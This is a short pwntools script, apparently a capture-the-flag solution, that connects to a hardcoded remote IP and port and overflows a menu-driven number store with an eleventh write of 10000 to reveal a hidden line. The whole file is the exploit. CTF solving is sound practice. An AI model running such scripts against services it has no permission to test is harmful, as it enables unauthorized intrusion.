from pwn import *

io = remote ('62.173.140.174', 17300)

io.recvuntil(b'Enter your choice (1-4): ')
io.sendline(b'1')

for i in range(10):
    io.recvuntil(b'Enter your choice (1-5): ')
    io.sendline(b'3')
    io.recvuntil(b'Enter a number to write: ')
    io.sendline(str(i))

io.recvuntil(b'Enter your choice (1-5): ')
io.sendline(b'3')
io.recvuntil(b'Enter a number to write: ')
io.sendline(b'10000')

io.recvuntil(b'Enter your choice (1-5): ')
io.sendline(b'4')
io.recvuntil(b'It turned out that Squidward was a robot.\n')
print(io.recvline())